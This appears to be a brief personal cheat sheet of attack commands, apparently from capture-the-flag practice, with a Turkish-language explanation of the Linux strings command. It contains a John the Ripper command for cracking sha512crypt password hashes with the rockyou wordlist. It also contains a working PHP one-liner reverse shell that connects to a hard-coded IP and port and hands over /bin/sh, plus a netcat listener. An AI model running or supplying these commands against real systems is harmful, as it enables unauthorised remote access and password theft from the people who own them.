# john 
    john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt passwd --min-len=6 --max-len=6
# php reverse shell
    php -r '$sock=fsockopen("10.2.12.26",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
    nc -lvp 
# işte Linux içerisinde bulunan binary (ikili) dosyaların içerisinde bulunan ve alfabetik olarak yazırılabilir karakter dizilerini görmemizi strings komutu sağlar. Yukarıdaki örnekte kullandığımız ls  dosyasına bir de strings komutu ile bakalım. Komut çıktısında görüldüğü gibi, ekrana yazdırılan karakterlerin daha anlamlı ve okunabilir olduğunu görebilirsiniz. strings komutu genelde programlama ile uğraşanlar tarafından kullanılır ve grep komutu ile birlikte filtreleme de kullanılır. Bununla ilgili bir örnek verelim.
    strings key_rev_key
